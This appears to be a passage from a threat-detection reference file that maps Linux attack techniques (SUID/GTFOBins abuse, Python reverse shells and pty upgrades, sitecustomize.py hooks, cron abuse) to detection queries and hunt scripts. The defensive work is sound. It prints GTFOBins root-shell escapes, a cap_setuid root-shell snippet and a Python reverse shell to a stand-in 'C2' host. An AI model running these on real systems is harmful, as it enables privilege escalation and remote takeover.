    if ! (dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null) | grep -q .; then
      echo "[FLAG] Non-packaged SUID: $f"
      ls -la "$f"
    fi
  done

echo ""
echo "[*] === GTFOBins candidates with SUID set ==="
BINS="python python2 python3 perl ruby awk nmap find vim vi \\
      less more env tee bash dash sh node lua php"
for b in $BINS; do
  p=$(which $b 2>/dev/null); [ -z "$p" ] && continue
  perms=$(stat -c '%a' "$p" 2>/dev/null)
  # SUID if first digit >= 4
  if [ "\${perms:0:1}" -ge 4 ] 2>/dev/null; then
    echo "[FLAG] SUID GTFOBin: $p (perms: $perms)"
  fi
done

echo ""
echo "[*] === Linux capabilities on interpreters ==="
getcap -r / 2>/dev/null | \\
  grep -E "(python|perl|ruby|node|lua|php|awk|vim|bash|dash)"

echo ""
echo "[*] === Sudoers: risky NOPASSWD entries ==="
grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/ 2>/dev/null | \\
  grep -vE "^#" | \\
  grep -E "(find|awk|vim|vi|less|more|env|tee|perl|python|ruby|node|bash|sh)"

echo ""
echo "[*] === auditd: SUID execve (auid != uid=0, today) ==="
ausearch -k exec -i --start today 2>/dev/null | \\
  awk '/SYSCALL/{line=$0} /uid=0/ && !/auid=0/ && !/auid=4294967295/{print line}'`,
        registry: `SUID/capabilities attack surface:

Find SUID binaries:
  find / -perm -4000 -type f 2>/dev/null   (SUID)
  find / -perm -2000 -type f 2>/dev/null   (SGID)

High-risk GTFOBins when SUID is set:
  /usr/bin/find      find . -exec /bin/sh -p \\; -quit
  /usr/bin/awk       awk 'BEGIN {system("/bin/sh")}'
  /usr/bin/vim       vim -c ':!/bin/sh'
  /usr/bin/less      less → !/bin/sh
  /usr/bin/env       env /bin/sh
  /usr/bin/python3   python3 -p (drops to effective UID)
  /usr/bin/perl      perl -e 'exec "/bin/sh";'
  /usr/bin/tee       tee write to /etc/sudoers.d/

Linux capabilities (stealthier than SUID):
  getcap -r / 2>/dev/null
  Dangerous: cap_setuid+ep, cap_dac_override+ep,
    cap_sys_admin+ep, cap_net_raw+ep, cap_sys_ptrace+ep
  
  Attack: python3 with cap_setuid:
    import os; os.setuid(0); os.system('/bin/bash')

Sudoers misconfigurations:
  /etc/sudoers
  /etc/sudoers.d/
  sudo -l                     - list current user's rules
  Dangerous: (ALL) NOPASSWD: /usr/bin/find
  
Reference: gtfobins.github.io
  Comprehensive catalog of Linux binary abuse paths`,
        tools: `SUID/GTFOBins abuse in active intrusions:

Post-ex enumeration tools:
- LinPEAS: automated SUID, capabilities, sudo -l enum
- LinEnum: enumerates all SUID binaries, sudo rules
- Linux Exploit Suggester: flags SUID opportunities
- PSPY: reveals SUID invocations in process monitoring
- Metasploit: post/multi/recon/local_exploit_suggester

Known intrusions:
- Web shell → www-data → SUID perl/python on legacy
  servers = instant root without any exploit needed
- Rocke (CN): enumerates GTFOBins post-compromise
  as privilege escalation step on cloud servers
- CTF/red team: SUID find, sudo vim are the two most
  frequently abused vectors in penetration tests

Capabilities attack (more subtle):
  python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
  (requires cap_setuid+ep on the python3 binary)
  Not visible in standard SUID check (find -perm -4000)
  ONLY detectable via getcap

Auditd signal for SUID execution:
  In SYSCALL record: uid=<real> but euid=0
  auid = original login UID (preserved even after SUID)
  Discrepancy auid != euid=0 = SUID execution occurred`,
        ossdetect: `Sigma rules:
- proc_creation_lnx_susp_suid_execution.yml
- proc_creation_lnx_gtfobins_sudo_abuse.yml
- proc_creation_lnx_find_shell_exec.yml
- proc_creation_lnx_awk_system_shell.yml

Elastic detection rules:
- SUID/SGID bit execution
- Linux Privilege Escalation via SUID Binary
- Potential GTFOBins Abuse

osquery:
  SELECT path, username, mode
  FROM file JOIN users ON file.uid = users.uid
  WHERE path LIKE '/usr/%' AND file.mode LIKE '4%';

Velociraptor:
  Linux.Sys.SUID (enumerate all SUID binaries)

LinPEAS (attack surface discovery):
  ./linpeas.sh | grep -A 3 "SUID"
  Run on suspect host to enumerate exposure

Atomic Red Team:
  T1548.001 (SetUID/SetGID abuse tests)
  Multiple tests for find, python, perl SUID exec

Auditd:
  ausearch -k exec -i | \\
    awk '/SYSCALL/{uid=$0} /uid=0/ && !/auid=0/{print uid}'
  Catches SUID executions where login UID != effective UID`,
        notes: "SUID binaries and Linux capabilities are the primary sudo-less privilege escalation paths on Linux. The key insight is that SUID execution doesn't look like privilege escalation at the process-creation level - it is a normal binary invocation. The signal is in process metadata: effective UID (euid) differs from real UID (ruid), meaning the binary ran with elevated privileges. Auditd SYSCALL records capture both uid and auid (audit UID = the original login UID), so a comparison reveals SUID execution. The GTFOBins site catalogs every Unix binary that can turn SUID into a shell, and the list is longer than most defenders expect: find, awk, vim, less, more, env, tee, and many more. Linux capabilities are the subtler variant - instead of the full SUID bit, a binary gets specific kernel capabilities (cap_setuid, cap_dac_override) that grant targeted but still dangerous privileges. Critically, these do not appear in ls -la permissions output and require getcap to discover. A python3 binary with cap_setuid+ep is functionally equivalent to SUID root but invisible to the standard SUID hunt command.",
        apt: [
          { cls: "apt-cn", name: "Rocke / 8220 Gang", note: "Post-compromise SUID enumeration and GTFOBins abuse documented as privilege escalation step in cloud server campaigns." },
          { cls: "apt-mul", name: "Web shell operators", note: "www-data context with SUID perl or python on legacy servers grants root without any exploit; common in web exploitation post-ex chains." },
          { cls: "apt-mul", name: "Red team / pen test tooling", note: "LinPEAS, LinEnum, and Metasploit automate SUID and capabilities enumeration as standard first post-exploitation step." }
        ],
        cite: "MITRE ATT&CK T1059.004"
      }
    ]
  },
  {
    id: "T1059.006",
    name: "Command and Scripting Interpreter: Python",
    desc: "Adversaries use Python (a default interpreter on most Linux distros) for execution, reverse shells, and tooling - via python -c one-liners, scripts, or imported modules.",
    rows: [
      {
        sub: "T1059.006 - Python One-Liner / Script Execution",
        os: "linux",
        indicator: "python/python3 invoked with -c inline code (especially socket/pty/os.system), or running a script from a writable/temp path, often spawning or spawned by a shell",
        sysmon: `// Sysmon for Linux ProcessCreate (EID 1)
EventID=1
Image=*/python OR */python2 OR */python3
CommandLine matches:
  *-c* *socket*  OR  *-c* *pty.spawn*          (reverse shell)
  *-c* *os.system* OR *-c* *subprocess*         (command exec)
  *-c* *base64* OR *-c* *exec(*  OR *-c* *eval(*
  */tmp/* OR */dev/shm/* OR *.py running from a writable dir

// Parent/child lineage:
ParentImage=*/bash spawned by a web service, OR
Image=*/python with ChildProcess=*/bash (py -> shell)`,
        kibana: `// Python inline execution with shell/socket primitives
process.name: ("python" OR "python2" OR "python3")
AND process.command_line: (*"-c"* AND (*socket* OR *pty.spawn* OR *os.system* OR *subprocess* OR *"exec("* OR *base64*))

// Python running a script from a writable/temp path
process.name: ("python" OR "python3")
AND process.command_line: (*"/tmp/"* OR *"/dev/shm/"* OR *"/var/tmp/"*)
AND NOT process.command_line: (*"/usr/lib/python"* OR *site-packages*)

// Python spawned by a network service (RCE)
process.name: ("python" OR "python3")
AND process.parent.name: ("nginx" OR "apache2" OR "httpd" OR "php-fpm" OR "java" OR "node")`,
        powershell: `# (Auditd / Shell hunt - Linux row)

# auditd execve hunt for python with suspicious args
ausearch -k exec -i | grep -E 'python[23]?' |
  grep -E -- '-c .*socket|pty.spawn|os.system|subprocess|exec\\(|base64|/tmp/|/dev/shm/'

# Live python processes + their command lines
ps -eo pid,ppid,user,comm,args | awk '$4 ~ /python/' |
  grep -E 'socket|pty|os.system|subprocess|/tmp/|/dev/shm/'

# Python scripts in writable/temp dirs (dropped tooling)
find /tmp /var/tmp /dev/shm /home -maxdepth 3 -name '*.py' \\
  -newermt '-7 days' 2>/dev/null -ls

# Check for python processes with a deleted backing file
for p in $(pgrep -f python); do
  ls -l /proc/$p/exe 2>/dev/null | grep -q deleted && echo "PID $p python (deleted)"
done`,
        registry: `(File Artifacts - Linux row)

No registry. Python execution artifacts:

Dropped scripts / payloads:
  /tmp/*.py , /dev/shm/*.py , /var/tmp/*.py
  ~/.cache , ~/.local  (user-context tooling)
  __pycache__ directories with recent .pyc files

Interpreter & module evidence:
  /proc/<pid>/cmdline (the -c payload or script path)
  /proc/<pid>/exe (interpreter binary; '(deleted)' = tell)
  Imported modules via /proc/<pid>/maps (loaded .so files)
  PYTHONSTARTUP / PYTHONPATH env tampering
    (check /proc/<pid>/environ and shell rc files)

Persistence-adjacent (worth noting):
  sitecustomize.py / usercustomize.py - auto-imported by
    the interpreter; a planted one runs on every python
    launch (a python-specific persistence/exec trick)

Investigation pivots:
- python -c with socket/pty.spawn is almost always a
  reverse shell - very high fidelity
- A .py in /dev/shm or /tmp executed recently
- sitecustomize.py outside the standard library path`,
        tools: `msfvenom python/meterpreter reverse shells
pty.spawn upgrade (the standard 'upgrade to interactive
  TTY' step after a basic reverse shell)
Sliver / Mythic python stagers
Empire (has Python/Linux agents)
pupy (Python-based cross-platform RAT)
GTFOBins - python entries for shell escape / SUID abuse
Manual operators - python -c reverse shells are second
  only to bash for hands-on Linux execution`,
        ossdetect: `Sigma (Linux rules):
- lnx_python_reverse_shell.yml
- lnx_susp_python_inline_exec.yml
- lnx_auditd_python_pty_spawn.yml

Atomic Red Team:
- T1059.006 (Python execution tests)

Auditd:
- execve logging captures the python -c command line

Sysmon for Linux:
- ProcessCreate (EID 1) for python with suspicious args

Falco:
- "Python spawned shell" / interpreter-in-container rules
  (strong for containerized workloads)`,
        notes: "Python is included as its own execution row because it ships by default on virtually every Linux distribution, making it a reliable interpreter for attackers who can't count on their own tooling being present. The two highest-value patterns: python -c with socket or pty.spawn (the canonical Python reverse shell, and the standard 'upgrade to interactive TTY' step that follows a basic shell), and python running a script from /tmp, /dev/shm, or /var/tmp (dropped tooling). The pty.spawn pattern in particular is almost never legitimate and is extremely high-fidelity. As with the shell row, a python process spawned by a network-facing service points at RCE/webshell, and a python process whose /proc/<pid>/exe shows '(deleted)' is running fileless. One Python-specific persistence/execution wrinkle worth knowing: sitecustomize.py and usercustomize.py are auto-imported on every interpreter start, so a planted copy outside the standard library is both execution and persistence - check for those. Telemetry is the same stack as the shell row (auditd execve, Sysmon for Linux EID 1, Falco for containers). Baseline legitimate Python automation heavily - many infra tools (Ansible, salt, cloud agents, monitoring) are Python and will generate -c and subprocess activity; scope the suspicious-args rules to socket/pty/temp-path patterns rather than alerting on all python -c.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Python tooling and reverse shells used against Linux server estates." },
          { cls: "apt-ir", name: "MuddyWater", note: "Python-based payloads and post-exploitation documented against Linux/cross-platform targets." },
          { cls: "apt-mul", name: "TeamTNT", note: "Python components in Linux cryptojacking and worm toolkits." },
          { cls: "apt-mul", name: "Red Team", note: "python -c reverse shells and pty.spawn upgrades are standard Linux post-ex tradecraft." },
        ],
        cite: "MITRE ATT&CK T1059.006",
      },
      {
        sub: "T1059.006 - Python pty.spawn TTY Upgrade and Socket Reverse Shell",
        os: "linux",
        indicator: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' — the near-universal dumb-shell-to-interactive upgrade used immediately after gaining a non-interactive reverse shell; or socket + os.dup2 + pty pattern for a full interactive socket-based shell",
        sysmon: `// Sysmon for Linux EID 1 (ProcessCreate)
// pty.spawn - very high confidence IOC

EventID=1
Image=(*python OR *python2 OR *python3)
CommandLine matches:
  *pty.spawn*                    (any pty.spawn call)
  *pty.spawn('/bin/bash'*
  *pty.spawn("/bin/bash"*
  *pty.spawn('/bin/sh'*

// Socket reverse shell anatomy
CommandLine matches:
  *socket(* AND *dup2(* AND (*exec* OR *bash* OR *sh*)
  *os.dup2(s.fileno()* AND (*0* OR *1* OR *2*)
  *socket.AF_INET* AND *socket.SOCK_STREAM*

// Combined pty + socket (fully interactive shell over network)
CommandLine matches:
  *pty* AND *socket* AND (*dup2* OR *connect*)

// EID 3 (NetworkConnect) from python process after pty.spawn
// Correlate: EID 1 python with pty.spawn args → EID 3 outbound`,
        kibana: `// pty.spawn - very high confidence, near-zero FP
process.name: ("python" OR "python2" OR "python3")
AND process.command_line: *pty.spawn*

// Socket reverse shell components
process.name: ("python" OR "python2" OR "python3")
AND process.command_line: (*socket* AND *dup2* AND (*exec* OR *bash* OR *sh*))

// Combined pty + socket (fully interactive)
process.name: ("python" OR "python2" OR "python3")
AND process.command_line: (*pty* AND *socket*)

// Sysmon for Linux EID 1
event.code: "1"
AND process.executable: (*python*)
AND process.command_line: (*pty.spawn* OR (*socket* AND *dup2*))

// EID 3 - python network connection (post pty.spawn)
event.code: "3"
AND process.name: "python*"
AND NOT destination.ip: ("127.0.0.1" OR "::1")
AND NOT destination.port: (80 OR 443 OR 8080 OR 8443)`,
        powershell: `#!/bin/bash
# T1059.006 - pty.spawn and socket reverse shell hunt

echo "[*] === auditd: pty.spawn invocations ==="
ausearch -k exec -i 2>/dev/null | \\
  grep -E "python[23]?" | grep "pty.spawn" | tail -30

echo ""
echo "[*] === auditd: python socket+dup2 reverse shells ==="
ausearch -k exec -i 2>/dev/null | \\
  grep -E "python[23]?" | \\
  grep -E "(socket.*dup2|dup2.*socket|AF_INET.*SOCK_STREAM)" | tail -30

echo ""
echo "[*] === Live python processes with external network connections ==="
for pid in $(pgrep -x python python3 python2 2>/dev/null | tr '\\n' ' '); do
  cmd=$(tr '\\0' ' ' < /proc/$pid/cmdline 2>/dev/null)
  conns=$(ss -tp 2>/dev/null | grep "pid=$pid,")
  if [ -n "$conns" ]; then
    echo "[FLAG] Python PID $pid has network socket:"
    echo "  CMD: $cmd"
    echo "  CONNS: $conns"
  fi
  if echo "$cmd" | grep -qE "(pty\\.spawn|socket.*dup2|AF_INET)"; then
    echo "[FLAG] Suspicious python command line: $cmd"
  fi
done

echo ""
echo "[*] === Python processes spawned by shells or services ==="
for pid in $(pgrep -x python python3 2>/dev/null); do
  ppid=$(awk '/PPid/{print $2}' /proc/$pid/status 2>/dev/null)
  parent=$(cat /proc/$ppid/comm 2>/dev/null)
  cmd=$(tr '\\0' ' ' < /proc/$pid/cmdline 2>/dev/null)
  if echo "$parent" | grep -qE "(bash|sh|dash|sshd|apache|nginx|php)"; then
    echo "Parent: $parent (PID $ppid) → python PID $pid"
    echo "  CMD: $cmd"
  fi
done

echo ""
echo "[*] === Dropped python payload files in writable paths ==="
find /tmp /dev/shm /var/tmp /run -name "*.py" 2>/dev/null | head -20`,
        registry: `Python reverse shell artifacts:

No registry on Linux. Evidence locations:

In-memory (no file on disk):
  /proc/<pid>/cmdline   - live process command line
  /proc/<pid>/environ   - attacker's environment vars
  (both survive only while process is running)

Network connections:
  /proc/<pid>/net/tcp   - active IPv4 socket connections
  /proc/<pid>/net/tcp6  - IPv6 connections
  ss -tp                - show TCP connections with PID
  lsof -i -p <pid>      - show all file descriptors

PTY artifacts from pty.spawn:
  /dev/pts/<n>          - pseudo-terminal allocated
  who / w               - shows active pts sessions
  last                  - historical pty logins

Dropped script files:
  /tmp/*.py , /dev/shm/*.py , /var/tmp/*.py

Standard pty.spawn upgrade sequence:
  1. python3 -c 'import pty;pty.spawn("/bin/bash")'
  2. Ctrl+Z (background the shell)
  3. stty raw -echo; fg
  (attacker now has fully interactive shell with tab completion,
   sudo prompts, vim support; indistinguishable from SSH session)

Socket reverse shell one-liner (canonical):
  python3 -c "import socket,os,pty;s=socket.socket();
    s.connect(('C2',4444));
    [os.dup2(s.fileno(),i) for i in range(3)];
    pty.spawn('/bin/bash')" `,
        tools: `pty.spawn is near-universal post-exploitation tradecraft:

Why it matters:
  Non-interactive shells (from curl|bash, webshells, cron)
  cannot run sudo, vi, ssh, or respond to password prompts.
  pty.spawn allocates a real pseudo-terminal, making the
  shell fully interactive — this is the step that enables
  all subsequent post-exploitation activities.

Standard upgrade command:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  (documented in every post-exploitation guide)

Socket reverse shell template (all-in-one):
  python3 -c "
    import socket,os,pty
    s=socket.socket()
    s.connect(('C2',4444))
    [os.dup2(s.fileno(),i) for i in range(3)]
    pty.spawn('/bin/bash')"

Used by essentially every post-ex framework:
- Metasploit python/meterpreter stages
- Empire Linux agents
- PentestMonkey reverse shell list (canonical reference)
- RevShells.com generated shells
- Custom implants from APT41, Lazarus, MuddyWater

APT41 (CN) - documented use of python pty in Linux staging
Lazarus (KP) - python socket shells in financial intrusions
MuddyWater (IR) - python reverse shells on Linux targets

Detection note:
  pty.spawn has essentially zero legitimate -c use in
  production environments. Any process.command_line
  containing pty.spawn is almost certainly post-exploitation.`,
        ossdetect: `Sigma rules:
- proc_creation_lnx_python_pty_spawn.yml
- proc_creation_lnx_python_reverse_shell.yml
- net_connection_lnx_python_external.yml

Elastic detection rules:
- Python Reverse Shell via pty Module
- Python Network Connection from Unusual Context

Falco (high-confidence):
  rule: Python Shell Spawned
  condition: proc.name=python* and
    proc.args contains pty.spawn
  Very low false positive in production environments

auditd + ausearch:
  ausearch -k exec -i --start today | \\
    grep python | grep pty.spawn

execsnoop (BCC tools):
  sudo execsnoop | grep -E "python.*pty"
  Real-time tracing of all execve; catches the pty.spawn
  the moment it runs

Zeek / Suricata:
  Correlate python process outbound connection with
  subsequent interactive session behavior
  (stdin-like packet pattern on non-HTTP port)

Atomic Red Team:
  T1059.006 tests include python reverse shell variants
  that exercise pty.spawn patterns`,
        notes: "pty.spawn('/bin/bash') is the single most common Python command used in active Linux intrusions. It is the universal step taken immediately after gaining a non-interactive shell (from curl|bash, a webshell, or a cron payload) to upgrade it to fully interactive. Nearly every operator runs this exact command within the first few interactions of a new shell. It is such a strong signal that alerting on any invocation of python with pty.spawn in the arguments has near-zero false positive rate in production environments - there is essentially no legitimate production use case for python -c with pty.spawn. The socket + os.dup2 pattern that accompanies it creates a complete network-backed interactive shell: the attacker connects a socket to their C2, then duplicates the socket file descriptor over stdin (fd 0), stdout (fd 1), and stderr (fd 2), so all shell I/O flows through the socket. The pty allocation makes the session indistinguishable from SSH at the pseudo-terminal level. Detection: auditd execve capture for pty.spawn in arguments, combined with EID 3 network connection from the python process to a non-internal IP, is definitive.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Python pty.spawn documented in post-exploitation tool chains for interactive Linux server access." },
          { cls: "apt-kp", name: "Lazarus", note: "Python socket reverse shells and pty upgrade documented in Linux financial intrusion tooling." },
          { cls: "apt-ir", name: "MuddyWater", note: "Python socket reverse shells documented in campaigns against Linux and cross-platform targets." },
          { cls: "apt-mul", name: "All interactive operators", note: "pty.spawn is documented post-exploitation tradecraft used across every interactive Linux intrusion; PentestMonkey reference shell is the most cited template." }
        ],
        cite: "MITRE ATT&CK T1059.006"
      },
      {
        sub: "T1059.006 - Python Startup Hook Abuse (sitecustomize.py / PYTHONSTARTUP)",
        os: "linux",
        indicator: "Malicious code injected into sitecustomize.py or usercustomize.py in Python's site-packages — executes automatically on every Python invocation regardless of the calling script or user; or PYTHONSTARTUP env var pointing to an attacker-controlled file for per-session execution",
        sysmon: `// Auditd rules — Python execution hook file monitoring

// sitecustomize.py in all Python versions
-a always,exit -F arch=b64 -S open,openat,creat,truncate \\
  -F dir=/usr/lib/python3 -F perm=w -k python_site_write
-a always,exit -F arch=b64 -S open,openat,creat,truncate \\
  -F dir=/usr/local/lib -F perm=w -k python_site_write
-a always,exit -F arch=b64 -S creat,open,openat \\
  -F dir=/usr/lib/python3/dist-packages -F perm=w -k python_site_write

// Specific file watches
-w /usr/lib/python3/dist-packages/sitecustomize.py -p wa -k python_hook
-w /usr/local/lib/python3.11/dist-packages/sitecustomize.py -p wa -k python_hook

// .pth file drops (path injection in site-packages)
// Sysmon for Linux EID 11: TargetFilename matches
//   *site-packages/sitecustomize.py
//   *dist-packages/sitecustomize.py
//   *site-packages/usercustomize.py
//   *site-packages/*.pth  (new .pth file)`,
        kibana: `// sitecustomize.py or usercustomize.py modification
event.module: "file_integrity"
AND file.name: ("sitecustomize.py" OR "usercustomize.py")

// Any write to Python site-packages paths
event.module: "file_integrity"
AND file.path: (
  *dist-packages/sitecustomize.py OR
  *site-packages/sitecustomize.py OR
  *dist-packages/usercustomize.py OR
  *site-packages/usercustomize.py
)

// Auditd key
event.module: "auditd"
AND tags: ("python_hook" OR "python_site_write")

// New .pth file created in site-packages (path injection)
event.module: "file_integrity"
AND file.path: (*site-packages/*.pth OR *dist-packages/*.pth)
AND event.type: "created"

// Sysmon EID 11
event.code: "11"
AND winlog.event_data.TargetFilename: (*sitecustomize.py OR *usercustomize.py)

// PYTHONSTARTUP env set to suspicious path in shell config
event.module: "file_integrity"
AND file.path: (/etc/profile.d/* OR */.bashrc OR */.bash_profile)
AND event.type: "updated"
// then grep content for PYTHONSTARTUP=`,
        powershell: `#!/bin/bash
# T1059.006 - Python startup hook hunt

echo "[*] === sitecustomize.py files (all Python versions) ==="
find / -name "sitecustomize.py" \\
  -not -path "*/proc/*" -not -path "*/sys/*" 2>/dev/null | \\
  while read f; do
    echo "--- $f ---"
    echo "  mtime:   $(stat -c '%y' "$f")"
    echo "  size:    $(stat -c '%s' "$f") bytes"
    echo "  package: $(dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null || echo 'NOT FROM PACKAGE')"
    cat "$f"
  done

echo ""
echo "[*] === usercustomize.py files ==="
find / -name "usercustomize.py" \\
  -not -path "*/proc/*" -not -path "*/sys/*" 2>/dev/null | \\
  while read f; do
    echo "--- $f ---"
    cat "$f"
  done

echo ""
echo "[*] === .pth files not from package manager ==="
find /usr /usr/local -name "*.pth" 2>/dev/null | \\
  while read f; do
    pkg=$(dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null)
    if [ -z "$pkg" ]; then
      echo "[FLAG] Non-packaged .pth: $f"
      cat "$f"
    fi
  done

echo ""
echo "[*] === PYTHONSTARTUP in running process environments ==="
for pid in $(pgrep -x python python3 2>/dev/null); do
  env_val=$(tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null | grep PYTHONSTARTUP)
  if [ -n "$env_val" ]; then
    echo "[FLAG] PID $pid: $env_val"
    echo "  CMD: $(tr '\\0' ' ' < /proc/$pid/cmdline)"
  fi
done

echo ""
echo "[*] === PYTHONSTARTUP/PYTHONPATH in shell configs ==="
grep -r "PYTHONSTARTUP\\|PYTHONPATH" \\
  /etc/profile /etc/profile.d/ /etc/bash.bashrc \\
  /root/.bashrc /root/.bash_profile \\
  /home/*/.bashrc /home/*/.bash_profile 2>/dev/null | grep -v "^#"

echo ""
echo "[*] === Recently modified Python site-packages (.py files) ==="
find /usr/lib/python3 /usr/local/lib/python3* \\
  -name "*.py" -mtime -7 -not -path "*/__pycache__/*" -ls 2>/dev/null | \\
  head -20`,
        registry: `Python startup hook locations:

sitecustomize.py (system-level — runs for ALL Python):
  /usr/lib/python3/dist-packages/sitecustomize.py
  /usr/lib/python3.<ver>/sitecustomize.py
  /usr/local/lib/python3.<ver>/site-packages/sitecustomize.py
  Executed automatically on EVERY Python interpreter start,
  regardless of calling user or script

usercustomize.py (user-level — no root needed):
  ~/.local/lib/python3.<ver>/site-packages/usercustomize.py
  Runs for current user's Python sessions only

.pth files (path injection):
  /usr/local/lib/python3.<ver>/dist-packages/*.pth
  Each line adds a directory to sys.path
  Allows loading of attacker-controlled modules

PYTHONSTARTUP environment variable:
  Set in ~/.bashrc, /etc/profile.d/*.sh
  Points to .py file executed on interactive Python sessions
  Example: export PYTHONSTARTUP=/tmp/.pyinit.py

PYTHONPATH hijacking:
  export PYTHONPATH=/tmp/malmodules:$PYTHONPATH
  Prepends attacker dir to module search path
  Malicious 'os.py' or 'requests.py' loads before stdlib

High-impact scenario:
  Root cron job runs python3 → sitecustomize.py backdoor
  runs with root privilege on every cron invocation
  (technique combines T1053.003 + T1059.006)`,
        tools: `Python hook persistence documented in:

Elastic Security Labs:
  'Approaching the Summit on Persistence Mechanisms'
  (February 2025) — sitecustomize.py and usercustomize.py
  documented with detection hunting rules

PANIX (persistence simulation):
  ./panix.sh --python (tests sitecustomize.py injection)
  github.com/Aegrah/PANIX

Pepe Berba blog series:
  'Hunting for Persistence in Linux'
  sitecustomize.py and .pth file abuse documented

APT/operator use cases:
  Useful when attacker wants code to run in context of
  every Python script on host — monitoring scripts,
  cron jobs, admin tools
  sitecustomize.py runs as whatever user invokes Python,
  making it privilege-aware persistence

PYTHONPATH hijacking (module shadowing):
  Attacker drops malicious requests.py or json.py in
  /tmp/malmodules/ then sets PYTHONPATH
  Every Python script that imports those names loads
  attacker code instead of stdlib

Detection via integrity:
  sitecustomize.py changes only during package installs
  (dpkg/pip). Any change outside a package install
  window = critical indicator`,
        ossdetect: `Sigma rules:
- file_event_lnx_python_sitecustomize_modification.yml
- file_event_lnx_python_pth_file_creation.yml
- proc_creation_lnx_python_startup_env.yml

Elastic Security Labs:
  'Approaching the Summit on Persistence' (2025)
  Python hook detection hunting rule included

PANIX:
  ./panix.sh --python
  Tests sitecustomize.py injection and PYTHONSTARTUP
  github.com/Aegrah/PANIX

AIDE / Tripwire:
  Add Python site-packages directories to integrity db:
  /usr/lib/python3 p+sha256+i+n+u+g
  /usr/local/lib/python3 p+sha256+i+n+u+g
  Any sitecustomize.py change = immediate alert

Package verify:
  dpkg --verify python3 python3-minimal (Debian)
  rpm -V python3 (RHEL)
  Flag on sitecustomize.py = critical investigate

auditd:
  ausearch -k python_site_write --start today
  ausearch -k python_hook --start today

Velociraptor:
  Linux.Detection.Artifacts (includes Python hook paths)
  Custom VQL: glob /usr/lib/python3/**/*customize*.py`,
        notes: "sitecustomize.py is a legitimate Python mechanism that executes automatically at every interpreter startup - it is designed for system administrators to customize the Python environment system-wide. An attacker with write access to this file gets code execution on every Python invocation on the host, regardless of which script is called or which user runs it. This is particularly dangerous in environments where Python is used in cron jobs, monitoring scripts, or system automation: backdoor code in sitecustomize.py runs with whatever privilege those scripts carry. The usercustomize.py variant is lower-privilege (no root needed, only affects current user) but easier to plant. The PYTHONSTARTUP variant is more limited - it fires only for interactive Python sessions, not scripted invocations - making it most useful for credential harvesting when administrators use the Python REPL. The .pth file technique is the most subtle: a .pth file with an import statement (supported in Python 2, via directory-based loading in Python 3) or an absolute path pointing to an attacker-controlled directory allows arbitrary module shadowing. Detection priority: file integrity monitoring on all Python site-packages directories, combined with package manager verification after any change - these directories should only change during dpkg/pip package installations.",
        apt: [
          { cls: "apt-mul", name: "Advanced operators", note: "sitecustomize.py persistence documented in Elastic Security Labs Linux persistence research 2024-2025; used for covert execution via system Python invocations." },
          { cls: "apt-mul", name: "Red team tooling", note: "PANIX tests sitecustomize.py injection; technique documented in multiple Linux persistence hunting guides." }
        ],
        cite: "MITRE ATT&CK T1059.006"
      }
    ]
  },
  {
    id: "T1053.003",
    name: "Scheduled Task/Job: Cron",
    desc: "Adversaries use cron (crontabs, /etc/cron.*, systemd timers) to execute code on a schedule - for execution and persistence. This row is the execution/abuse-detection angle.",
    rows: [
      {
        sub: "T1053.003 - Cron Job / Crontab Abuse",
        os: "linux",
        indicator: "Creation or modification of a crontab or /etc/cron.* entry invoking a shell/interpreter or a payload in a writable path - or cron spawning a suspicious child",
        sysmon: `// Sysmon for Linux: file modify (EID 11) of cron locations,
// and ProcessCreate (EID 1) of cron-spawned children.
EventID=11 (FileCreate / modify)
TargetFilename matches:
  /etc/crontab
  /etc/cron.d/*  /etc/cron.hourly/*  /etc/cron.daily/*
  /var/spool/cron/*  /var/spool/cron/crontabs/*
  /etc/systemd/system/*.timer

EventID=1 (cron-spawned execution)
ParentImage=*/cron OR */crond OR */CRON
Image=*/bash OR */sh OR */python* OR */curl OR */wget
CommandLine = a payload / download / reverse shell`,
        kibana: `// Cron file modification
winlog.event_id: 11
AND file.path: ("/etc/crontab" OR "/etc/cron.d/*" OR "/etc/cron.hourly/*" OR "/etc/cron.daily/*" OR "/etc/cron.weekly/*" OR "/var/spool/cron/*" OR "/etc/systemd/system/*.timer")

// cron daemon spawning a suspicious child
process.parent.name: ("cron" OR "crond" OR "CRON")
AND process.name: ("bash" OR "sh" OR "python" OR "python3" OR "curl" OR "wget" OR "nc")
AND process.command_line: (*curl* OR *base64* OR *"/dev/tcp/"* OR *"/tmp/"* OR *"/dev/shm/"*)

// auditd watch on cron paths (if configured)
auditd.data.key: "cron_persist"`,
        powershell: `# (Auditd / Shell hunt - Linux row)

# Enumerate ALL cron entries across the system (review each)
for u in $(cut -f1 -d: /etc/passwd); do
  crontab -l -u "$u" 2>/dev/null | grep -v '^#' | sed "s/^/[$u] /"
done
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ \\
  /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
ls -la /var/spool/cron/ /var/spool/cron/crontabs/ 2>/dev/null

# systemd timers (the modern cron)
systemctl list-timers --all
for t in /etc/systemd/system/*.timer; do echo "== $t =="; cat "$t"; done 2>/dev/null

# auditd watch rules for cron tampering:
#   -w /etc/crontab -p wa -k cron_persist
#   -w /etc/cron.d/ -p wa -k cron_persist
#   -w /var/spool/cron/ -p wa -k cron_persist
ausearch -k cron_persist -i 2>/dev/null

# Flag cron entries invoking shells/downloads/temp paths
grep -RnE 'curl|wget|base64|/dev/tcp/|/tmp/|/dev/shm/|bash -i' \\
  /etc/crontab /etc/cron.* /var/spool/cron 2>/dev/null`,
        registry: `(File Artifacts - Linux row)

No registry. Cron artifact locations (all worth a sweep):

System-wide:
  /etc/crontab               (master system crontab)
  /etc/cron.d/*              (drop-in system cron files)
  /etc/cron.hourly|daily|weekly|monthly/*  (script dirs)

Per-user:
  /var/spool/cron/<user>            (RHEL/CentOS)
  /var/spool/cron/crontabs/<user>   (Debian/Ubuntu)

systemd timers (modern equivalent):
  /etc/systemd/system/*.timer + matching *.service
  /usr/lib/systemd/system/*.timer
